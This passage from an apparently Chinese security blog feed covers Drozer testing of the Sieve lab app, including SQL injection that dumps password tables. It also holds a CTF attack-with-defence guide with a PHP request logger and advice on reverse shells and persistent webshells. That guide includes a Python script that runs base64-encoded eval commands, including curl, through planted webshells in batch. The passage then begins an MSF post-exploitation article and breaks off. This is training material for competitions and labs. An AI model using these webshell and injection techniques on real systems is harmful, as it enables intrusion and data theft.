&#39;minimal-su&#39; binary installation on the     </span><br><span class="line">                            device.</span><br></pre></td></tr></table></figure>



<h2 id="0x03-测试步骤"><a href="#0x03-测试步骤" class="headerlink" title="0x03 测试步骤"></a>0x03 测试步骤</h2><h3 id="1-获取包名"><a href="#1-获取包名" class="headerlink" title="1.获取包名"></a>1.获取包名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h3 id="2-获取应用的基本信息"><a href="#2-获取应用的基本信息" class="headerlink" title="2.获取应用的基本信息"></a>2.获取应用的基本信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h3 id="3-确定攻击面"><a href="#3-确定攻击面" class="headerlink" title="3.确定攻击面"></a>3.确定攻击面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h3 id="4-Activity"><a href="#4-Activity" class="headerlink" title="4.Activity"></a>4.Activity</h3><h4 id="（-1-）获取-activity-信息"><a href="#（-1-）获取-activity-信息" class="headerlink" title="（ 1 ）获取 activity 信息"></a>（ 1 ）获取 activity 信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h4 id="（-2-）启动-activity"><a href="#（-2-）启动-activity" class="headerlink" title="（ 2 ）启动 activity"></a>（ 2 ）启动 activity</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve dz&gt; help app.activity.start usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY] [--component PACKAGE COMPONENT] [--data-uri DATA_URI] [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]] [--mimetype MIMETYPE]</span><br></pre></td></tr></table></figure>



<h3 id="5-Content-Provider"><a href="#5-Content-Provider" class="headerlink" title="5.Content Provider"></a>5.Content Provider</h3><h4 id="（-1-）获取-Content-Provider-信息"><a href="#（-1-）获取-Content-Provider-信息" class="headerlink" title="（ 1 ）获取 Content Provider 信息"></a>（ 1 ）获取 Content Provider 信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h4 id="（2）Content-Providers-（数据泄露）"><a href="#（2）Content-Providers-（数据泄露）" class="headerlink" title="（2）Content Providers （数据泄露）"></a>（2）Content Providers （数据泄露）</h4><p><strong>先获取所有可以访问的 Uri ：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p><strong>获取各个 Uri 的数据：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --vertical</span><br></pre></td></tr></table></figure>

<p><strong>查询到数据说明存在漏洞</strong></p>
<h4 id="（3）Content-Providers-（-SQL-注入）"><a href="#（3）Content-Providers-（-SQL-注入）" class="headerlink" title="（3）Content Providers （ SQL 注入）"></a>（3）Content Providers （ SQL 注入）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM SQLITE_MASTER WHERE type&#x3D;&#39;table&#39;;--&quot;</span><br></pre></td></tr></table></figure>

<p><strong>报错则说明存在 SQL 注入。</strong></p>
<p><strong>列出所有表：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM SQLITE_MASTER WHERE type&#x3D;&#39;table&#39;;--&quot;</span><br></pre></td></tr></table></figure>

<p><strong>获取某个表（如 Key ）中的数据：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure>



<h4 id="（-4-）同时检测-SQL-注入和目录遍历"><a href="#（-4-）同时检测-SQL-注入和目录遍历" class="headerlink" title="（ 4 ）同时检测 SQL 注入和目录遍历"></a>（ 4 ）同时检测 SQL 注入和目录遍历</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h3 id="6-Service"><a href="#6-Service" class="headerlink" title="6.Service"></a>6.Service</h3><h4 id="（1）获取-service-详情"><a href="#（1）获取-service-详情" class="headerlink" title="（1）获取 service 详情"></a>（1）获取 service 详情</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h4 id="7-其它模块"><a href="#7-其它模块" class="headerlink" title="7. 其它模块"></a>7. 其它模块</h4><p><strong>shell.start</strong> 在设备上开启一个交互shell</p>
<p><strong>tools.file.upload / tools.file.download</strong> 上传/下载文件到设备 <strong>tools.setup.busybox / tools.setup.minimalsu</strong> 安装可用的二进制文件</p>
]]></content>
      <categories>
        <category>Android测试</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF线下AWD流程和准备工作</title>
    <url>/2019/06/21/CTF/CTF%E7%BA%BF%E4%B8%8BAWD%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="0x00-AWD"><a href="#0x00-AWD" class="headerlink" title="0x00 AWD"></a>0x00 AWD</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/11111.jpeg" alt="img"></p>
<p>AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
<ol>
<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
<li>各队一般都有自己的初始分数；</li>
<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
<li>扣除的积分由获取flag的队伍均分；</li>
<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
<li>一般每个队伍会给一个低权限用户，非root权限；</li>
</ol>
<p>你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。也就是说，攻击别人的靶机可以获取 Flag 分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。</p>
<h2 id="0x02-赛前准备"><a href="#0x02-赛前准备" class="headerlink" title="0x02 赛前准备"></a>0x02 赛前准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 各种软件包，如 Python、CURL 等等，以备机器上没有而陷入尴尬 </span><br><span class="line">2. 一大堆 EXP 库和漏洞库，可以放个乌云的虚拟机备用</span><br><span class="line">3. 加固、基线检查脚本</span><br><span class="line">4. WAF 代码和部署脚本</span><br><span class="line">5. AWD 专用的批量拿 Webshell、批量交 flag、批量维持权限的基本代码或小框架</span><br></pre></td></tr></table></figure>

<p>比赛前可以准备一个脚本集，集成到一个框架中，这样打AWD会很流畅</p>
<h2 id="0x03-人员分工"><a href="#0x03-人员分工" class="headerlink" title="0x03 人员分工"></a>0x03 人员分工</h2><p>线下赛一般3人左右，2人攻击，1人防御，发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。</p>
<p>比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以每人负责一台，各自负责攻击和防御。</p>
<h2 id="0x04-防守流程"><a href="#0x04-防守流程" class="headerlink" title="0x04 防守流程"></a>0x04 防守流程</h2><h3 id="1-修改ssh密码"><a href="#1-修改ssh密码" class="headerlink" title="1.修改ssh密码"></a>1.修改ssh密码</h3><p>官方在给出服务器密码时，很有可能是默认的，这个时候需要比较手速了，需要赶快修改自己的密码并尝试能不能登录别人的靶机，还有很多时候会只给出一个ip需要尽快做端口的爆破以及修改</p>
<h3 id="2-备份网站源码和数据库。"><a href="#2-备份网站源码和数据库。" class="headerlink" title="2.备份网站源码和数据库。"></a>2.备份网站源码和数据库。</h3><p>一、防止自己修改网站源码或数据库后无法恢复</p>
<p>二、防止对手入侵主机删除源码服务无法正常运行</p>
<p>ps:   比赛会check服务是否正常，不正常会进行扣分</p>
<h4 id="1-备份网站源码"><a href="#1-备份网站源码" class="headerlink" title="1.备份网站源码"></a>1.备份网站源码</h4><p>（1）</p>
<p>使用xftp，filezilla client，xshell等工具 将源码备份下来</p>
<p>（2）使用scp命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -P Port remote_username@remote_ip:remote_folder local_file</span><br></pre></td></tr></table></figure>



<h4 id="2-备份数据库"><a href="#2-备份数据库" class="headerlink" title="2.备份数据库"></a>2.备份数据库</h4><p>（1）备份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump -h127.0.0.1 -uroot -ppass database &gt; d:&#x2F;backupfile.sql</span><br></pre></td></tr></table></figure>

<p>（2）还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;mysql                  &#x2F;&#x2F;切换mmysql库目录</span><br><span class="line">mysql -uroot -ppass database&lt;backupfile.sql</span><br></pre></td></tr></table></figure>



<h3 id="3-检查系统安全性"><a href="#3-检查系统安全性" class="headerlink" title="3.检查系统安全性"></a>3.检查系统安全性</h3><p>关闭无需开放的端口、检查端口以及服务弱口令，mysql默认密码等，是否做了ssh登录限制，这里建议使用脚本统一完成</p>
<h3 id="4-拿到源码之后使用D盾查杀"><a href="#4-拿到源码之后使用D盾查杀" class="headerlink" title="4.拿到源码之后使用D盾查杀"></a>4.拿到源码之后使用D盾查杀</h3><p>拿到源码后进行D盾查杀检测预留后门这是送分题，同时可以利用这个漏洞迅速发起攻击，或用此一直维持权限</p>
<h3 id="5-修改权限"><a href="#5-修改权限" class="headerlink" title="5.修改权限"></a>5.修改权限</h3><p>比如mysql用户读表权限，上传目录是否可执行的权限等</p>
<h3 id="6-部署WAF"><a href="#6-部署WAF" class="headerlink" title="6.部署WAF"></a>6.部署WAF</h3><p>用自己提前准备好的WAF，使用给脚本进行快速部署，但是需要验证部署后服务是否宕机，需要注意，比赛很容易被check down。</p>
<p>a)在所需要在php文件前加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require_once(&#39;waf.php&#39;);</span><br></pre></td></tr></table></figure>

<p>如果想要整站防护，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！</p>
<p>添加require_once(‘waf.php’);来调用本代码</p>
<p>常用php系统添加文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure>

<p>b)在每个文件中加入代码</p>
<p>在php.ini中找到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Automatically add files before or after any PHP document.</span><br><span class="line">auto_prepend_file &#x3D; 360_safe3.php路径;</span><br></pre></td></tr></table></figure>



<h3 id="7-部署文件监控脚本"><a href="#7-部署文件监控脚本" class="headerlink" title="7.部署文件监控脚本"></a>7.部署文件监控脚本</h3><p>控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">强行 kill 掉进程后重启服务</span><br><span class="line">建立一个和不死马相同名字的文件或者目录</span><br><span class="line">写脚本不断删除文件</span><br><span class="line">不断写入一个和不死马同名的文件</span><br></pre></td></tr></table></figure>

<p>监测脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0); </span><br><span class="line">define(&#39;LOG_FILEDIR&#39;,&#39;.&#x2F;logs&#39;); </span><br><span class="line">function waf() </span><br><span class="line">&#123; </span><br><span class="line">if (!function_exists(&#39;getallheaders&#39;)) &#123; </span><br><span class="line">function getallheaders() &#123; </span><br><span class="line">foreach ($_SERVER as $name &#x3D;&gt; $value) &#123; </span><br><span class="line">if (substr($name, 0, 5) &#x3D;&#x3D; &#39;HTTP_&#39;) </span><br><span class="line">$headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] &#x3D; $value; </span><br><span class="line">&#125; </span><br><span class="line">return $headers; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$get &#x3D; $_GET; </span><br><span class="line">$post &#x3D; $_POST; </span><br><span class="line">$cookie &#x3D; $_COOKIE; </span><br><span class="line">$header &#x3D; getallheaders(); </span><br><span class="line">$files &#x3D; $_FILES; </span><br><span class="line">$ip &#x3D; $_SERVER[&quot;REMOTE_ADDR&quot;]; </span><br><span class="line">$method &#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;]; </span><br><span class="line">$filepath &#x3D; $_SERVER[&quot;SCRIPT_NAME&quot;]; </span><br><span class="line">foreach ($_FILES as $key &#x3D;&gt; $value) &#123; </span><br><span class="line">$files[$key][&#39;content&#39;] &#x3D; file_get_contents($_FILES[$key][&#39;tmp_name&#39;]); </span><br><span class="line">file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;virink&quot;); </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unset($header[&#39;Accept&#39;]);</span><br><span class="line">$input &#x3D; array(&quot;Get&quot;&#x3D;&gt;$get, &quot;Post&quot;&#x3D;&gt;$post, &quot;Cookie&quot;&#x3D;&gt;$cookie, &quot;File&quot;&#x3D;&gt;$files, &quot;Header&quot;&#x3D;&gt;$header);</span><br><span class="line"> </span><br><span class="line">logging($input);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function logging($var)&#123; </span><br><span class="line">$filename &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">$LOG_FILENAME &#x3D; LOG_FILEDIR.&quot;&#x2F;&quot;.$filename;</span><br><span class="line">$time &#x3D; date(&quot;Y-m-d G:i:s&quot;);</span><br><span class="line">file_put_contents($LOG_FILENAME, &quot;\r\n&quot;.$time.&quot;\r\n&quot;.print_r($var, true), FILE_APPEND); </span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.&#39;http:&#x2F;&#x2F;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;PHP_SELF&#39;].&#39;?&#39;.$_SERVER[&#39;QUERY_STRING&#39;], FILE_APPEND);</span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n***************************************************************&quot;,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">waf(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="8-部署流量监控脚本或开启服务器日志记录。"><a href="#8-部署流量监控脚本或开启服务器日志记录。" class="headerlink" title="8.部署流量监控脚本或开启服务器日志记录。"></a>8.部署<strong>流量监控</strong>脚本或开启服务器日志记录。</h3><p>目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。</p>
<p>在比赛机器上使用tcpdump进行流量抓取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -s 0 -w flow.pcap port 9999</span><br></pre></td></tr></table></figure>



<h3 id="9-时刻关注流量和积分榜"><a href="#9-时刻关注流量和积分榜" class="headerlink" title="9.时刻关注流量和积分榜"></a>9.时刻关注流量和积分榜</h3><p>时刻看着自己的分数，看到自己被down了就赶紧恢复，不管被删库还是被自己删了什么重要配置文件或者还是上的通用waf脚本过不了check。</p>
<h2 id="0x05-攻击流程"><a href="#0x05-攻击流程" class="headerlink" title="0x05 攻击流程"></a>0x05 攻击流程</h2><h3 id="1-预留后门及弱口令"><a href="#1-预留后门及弱口令" class="headerlink" title="1.预留后门及弱口令"></a>1.预留后门及弱口令</h3><p>即使发现预留后门以及弱口令可以上传一些反弹shell内php 用nc连接一直拿分</p>
<h3 id="2-信息收集、探测端口、探测端口服务端口攻击"><a href="#2-信息收集、探测端口、探测端口服务端口攻击" class="headerlink" title="2.信息收集、探测端口、探测端口服务端口攻击"></a>2.信息收集、探测端口、探测端口服务端口攻击</h3><p>这是时候需要体现手速和相应的脚本可以使用自己收集或者熟悉的比如，nmap，msf啥的方便进行后渗透</p>
<h3 id="3-web框架漏洞"><a href="#3-web框架漏洞" class="headerlink" title="3.web框架漏洞"></a>3.web框架漏洞</h3><p>web大多数为php 也有java、python等，一种是已有漏洞的框架一种是出题人自己写的框架，需要在电脑中备好EXP库，漏洞库、扫描库以及相应的提权辅助脚本</p>
<h3 id="4-源代码进行代码审计"><a href="#4-源代码进行代码审计" class="headerlink" title="4.源代码进行代码审计"></a>4.源代码进行代码审计</h3><p>D盾查杀反馈防守队友，Seay等源码审计工具（报错率也是极高的），发现问题迅速验证，并报给防守队友，编写攻击脚本</p>
<h3 id="5-维持权限"><a href="#5-维持权限" class="headerlink" title="5.维持权限"></a>5.维持权限</h3><p>对拿到webshell的点要维持权限，在AWD中优先考虑种不死马、反弹shell等工具</p>
<h3 id="6-编写脚本批量拿分"><a href="#6-编写脚本批量拿分" class="headerlink" title="6.编写脚本批量拿分"></a>6.编写脚本批量拿分</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import sys,requests,base64</span><br><span class="line"> </span><br><span class="line">def loadfile(filepath):</span><br><span class="line">	try : </span><br><span class="line">		file &#x3D; open(filepath,&quot;rb&quot;)</span><br><span class="line">		return str(file.read())</span><br><span class="line">	except : </span><br><span class="line">		print &quot;File %s Not Found!&quot; %filepath</span><br><span class="line">		sys.exit()</span><br><span class="line"> </span><br><span class="line">def file_write(filepath,filecontent):</span><br><span class="line">	file &#x3D; open(filepath,&quot;a&quot;)</span><br><span class="line">	file.write(filecontent)</span><br><span class="line">	file.close()</span><br><span class="line"> </span><br><span class="line">def getflag(url,method,passwd,flag_path):</span><br><span class="line">	#flag机的url</span><br><span class="line">	flag_url&#x3D;&quot;192.168.45.1&quot;</span><br><span class="line">	#print url</span><br><span class="line">	#判断shell是否存在</span><br><span class="line">	try :</span><br><span class="line">		res &#x3D; requests.get(url,timeout&#x3D;3)</span><br><span class="line">	except : </span><br><span class="line">		print &quot;[-] %s ERR_CONNECTION_TIMED_OUT&quot; %url</span><br><span class="line">		file_write(flag_path,&quot;[-] %s ERR_CONNECTION_TIMED_OUT\n\n&quot; %url)</span><br><span class="line">		return 0</span><br><span class="line">	if res.status_code!&#x3D;200 :</span><br><span class="line">		print &quot;[-] %s Page Not Found!&quot; %url</span><br><span class="line">		file_write(flag_path,&quot;[-] %s Page Not Found!\n\n&quot; %url)</span><br><span class="line">		return 0</span><br><span class="line">	#执行命令来获取flag system,exec,passthru,&#96;,shell_exec</span><br><span class="line">	#a&#x3D;@eval(base64_decode($_GET[z0]));&amp;z0&#x3D;c3lzdGVtKCJ3aG9hbWkiKTs&#x3D;</span><br><span class="line">	cmd &#x3D; &quot;curl &quot;+flag_url</span><br><span class="line">	#cmd &#x3D; &quot;whoami&quot;</span><br><span class="line">	getflag_cmd &#x3D;&quot;echo system(\&quot;%s\&quot;);&quot;%cmd</span><br><span class="line">	data&#x3D;&#123;&#125;</span><br><span class="line">	if method&#x3D;&#x3D;&#39;get&#39;:</span><br><span class="line">		data[passwd]&#x3D;&#39;@eval(base64_decode($_GET[z0]));&#39;</span><br><span class="line">		data[&#39;z0&#39;]&#x3D;base64.b64encode(getflag_cmd)</span><br><span class="line">		try:</span><br><span class="line">			res &#x3D; requests.get(url,params&#x3D;data,timeout&#x3D;3)</span><br><span class="line">			#print res.url</span><br><span class="line">			if res.content:</span><br><span class="line">				content &#x3D; url+&quot;\n&quot;+res.content+&quot;\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">				print &quot;[+] %s getflag sucessed!&quot;%url</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s cmd exec response is null!&quot;%url</span><br><span class="line">				content &#x3D; url+&quot;\ncmd exec response is null!\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">		except :</span><br><span class="line">			file_write(flag_path,&quot;\n[+] %s Getflag Failed! You can check the shell&#39;s passwd!\n\n&quot;%url)</span><br><span class="line">			print &quot;[+] %s Getflag Failed! You can check the shell&#39;s passwd!&quot;%url</span><br><span class="line">	elif method&#x3D;&#x3D;&#39;post&#39;:</span><br><span class="line">		data[&#39;pass&#39;]&#x3D;&#39;Sn3rtf4ck&#39;</span><br><span class="line">		data[passwd]&#x3D;&#39;@eval(base64_decode($_POST[z0]));&#39;</span><br><span class="line">		data[&#39;z0&#39;]&#x3D;base64.b64encode(getflag_cmd)</span><br><span class="line">		try:</span><br><span class="line">			res &#x3D; requests.post(url,data&#x3D;data,timeout&#x3D;3)</span><br><span class="line">			if res.content:</span><br><span class="line">				content &#x3D; url+&quot;\n&quot;+res.content+&quot;\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">				print &quot;[+] %s getflag sucessed!&quot;%url</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s cmd exec response is null!&quot;%url</span><br><span class="line">				content &#x3D; url+&quot;\ncmd exec response is null!\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">		except:</span><br><span class="line">			file_write(flag_path,&quot;\n[+] %s Getflag Failed! You can check the shell&#39;s passwd!\n\n&quot;%url)</span><br><span class="line">			print &quot;[+] %s Getflag Failed! You can check the shell&#39;s passwd!&quot;%url</span><br><span class="line">	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	#存放flag的文件</span><br><span class="line">	flag_path&#x3D;&quot;.&#x2F;flag.txt&quot;</span><br><span class="line">	shellstr&#x3D;loadfile(&quot;.&#x2F;webshell.txt&quot;)</span><br><span class="line">	list &#x3D; shellstr.split(&quot;\r\n&quot;)</span><br><span class="line">	#print str(list)</span><br><span class="line">	i &#x3D; 0</span><br><span class="line">	url&#x3D;&#123;&#125;</span><br><span class="line">	passwd&#x3D;&#123;&#125;</span><br><span class="line">	method&#x3D;&#123;&#125;</span><br><span class="line">	for data in list:</span><br><span class="line">		if data:</span><br><span class="line">			ls &#x3D; data.split(&quot;,&quot;)</span><br><span class="line">			method_tmp &#x3D; str(ls[1])</span><br><span class="line">			method_tmp &#x3D; method_tmp.lower()</span><br><span class="line">			if method_tmp&#x3D;&#x3D;&#39;post&#39; or method_tmp&#x3D;&#x3D;&#39;get&#39;:</span><br><span class="line">				url[i]&#x3D;str(ls[0])</span><br><span class="line">				method[i]&#x3D;method_tmp</span><br><span class="line">				passwd[i]&#x3D;str(ls[2])</span><br><span class="line">				i+&#x3D;1</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s request method error!&quot; %(str(ls[0]))</span><br><span class="line">				file_write(flag_path,&quot;[-] %s request method error!\n\n&quot; %(str(ls[0])))</span><br><span class="line">		else : pass</span><br><span class="line">	#print str(len(url))</span><br><span class="line">	for j in range(len(url)):</span><br><span class="line">		#调用执行命令的模块</span><br><span class="line">		#print str(j)</span><br><span class="line">		#print &quot;url is %s method is %s passwd is %s&quot; %(url[j],method[j],passwd[j])</span><br><span class="line">		getflag(url&#x3D;url[j],method&#x3D;method[j],passwd&#x3D;passwd[j],flag_path&#x3D;flag_path)</span><br><span class="line">	print &quot;Getflag finished!&quot;</span><br></pre></td></tr></table></figure>



<h2 id="0x06-资源分享"><a href="#0x06-资源分享" class="headerlink" title="0x06 资源分享"></a>0x06 资源分享</h2><p>Github资源：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AWD攻防赛脚本集合: &lt;https:&#x2F;&#x2F;github.com&#x2F;admintony&#x2F;Prepare-for-AWD&gt;</span><br><span class="line"> </span><br><span class="line">Attack-Defense-Framework: &lt;https:&#x2F;&#x2F;github.com&#x2F;SniperOJ&#x2F;Attack-Defense-Framework&#x2F;tree&#x2F;v2&gt;</span><br><span class="line"> </span><br><span class="line">AWD攻防赛webshell批量利用框架: &lt;https:&#x2F;&#x2F;github.com&#x2F;Ares-X&#x2F;AWD-Predator-Framework&gt;</span><br><span class="line"> </span><br><span class="line">awd-frame: &lt;https:&#x2F;&#x2F;github.com&#x2F;xnianq&#x2F;awd-frame&gt;</span><br><span class="line"> </span><br><span class="line">WEB-AWD-Framework:&lt;https:&#x2F;&#x2F;github.com&#x2F;dahua966&#x2F;WEB-AWD-Framework&gt;</span><br><span class="line"> </span><br><span class="line">AWD-helper: &lt;https:&#x2F;&#x2F;github.com&#x2F;sarleon&#x2F;AWD-helper&gt;</span><br></pre></td></tr></table></figure>

<p>AWD经验：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-聊聊AWD攻防赛流程及准备经验：</span><br><span class="line">&lt;https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;201222.html&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下赛AWD模式下的生存技巧: &lt;https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;84675&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下赛AWD套路小结: &lt;https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;25&gt;</span><br><span class="line"></span><br><span class="line">- AWD混战攻略: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;d21b7e1bffaf&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下AWD攻防模式的准备工作及起手式: &lt;https:&#x2F;&#x2F;blog.csdn.net&#x2F;like98k&#x2F;article&#x2F;details&#x2F;80261603&gt;</span><br><span class="line"></span><br><span class="line">- 2017强网杯线下AWD攻防总结（适合新手）: &lt;https:&#x2F;&#x2F;www.t00ls.net&#x2F;articles-42278.html&gt;</span><br><span class="line"></span><br><span class="line">- AWD攻防线下生存之道: [http:&#x2F;&#x2F;47.95.201.153&#x2F;blog&#x2F;AWD攻防线下生存之道.html](http:&#x2F;&#x2F;47.95.201.153&#x2F;blog&#x2F;AWD%E6%94%BB%E9%98%B2%E7%BA%BF%E4%B8%8B%E7%94%9F%E5%AD%98%E4%B9%8B%E9%81%93.html)</span><br><span class="line"></span><br><span class="line">- CTF AWD模式攻防Note: &lt;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nul1&#x2F;p&#x2F;9576386.html&gt;</span><br></pre></td></tr></table></figure>

<p>权限维持：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 不死马的删除: &lt;https:&#x2F;&#x2F;yq.aliyun.com&#x2F;zt&#x2F;325638&gt;</span><br><span class="line"></span><br><span class="line">- awd攻防之kill不死马: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;ba79686987da&gt;</span><br><span class="line"></span><br><span class="line">- python中的后渗透|也可用于AWD攻防–shell管理: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;2e8e7330b73e&gt;</span><br><span class="line"></span><br><span class="line">- 从0到1掌握AWD攻防之RSA必杀: &lt;https:&#x2F;&#x2F;www.360zhijia.com&#x2F;anquan&#x2F;456324.html&gt;</span><br><span class="line"></span><br><span class="line">- 资深大牛教你如何web端权限维持（内附具体步骤）: [http:&#x2F;&#x2F;www.sohu.com&#x2F;a&#x2F;127074604\_472906](http:&#x2F;&#x2F;www.sohu.com&#x2F;a&#x2F;127074604_472906)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF进行后渗透测试</title>
    <url>/2018/12/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p><strong>MSF进行后渗透测试</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22041.png" alt="0"></p>
<p>在对目标进行渗透测试的时候，通常情况下，我们首先获得的是一台web服务器的webshell或者反弹shell，如果权限比较低，则需要进行权限提升；后续需要对系统进行全面的分析，搞清楚系统的用途；如果目标处于一个内网环境中，那么我们就需要通过它对内网的其它终端进行信息收集和渗透测试，更全面地挖掘系统中存在的安全隐患。</p>
<p><strong>一、获取Meterpreter会话</strong></p>
<p><strong>1.直接获取</strong></p>
<p><strong>（1）使用msfvenom生成payload</strong></p>
<p>常用命令：</p>
